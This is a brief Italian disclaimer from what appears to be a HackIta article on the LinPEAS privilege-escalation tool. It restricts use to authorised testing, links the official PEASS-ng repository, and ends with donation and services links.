LinPEAS è uno strumento per **penetration testing autorizzato** e **ricerca in sicurezza informatica**. L'uso senza esplicita autorizzazione scritta del proprietario del sistema è illegale in quasi tutte le giurisdizioni.

Utilizza LinPEAS esclusivamente in:

* Ambienti di laboratorio controllati
* Sistemi di tua proprietà
* Engagement di penetration testing con contratto firmato

Gli autori di questo articolo e HackIta non sono responsabili per usi impropri.

**Repository ufficiale:** [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)

***

Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
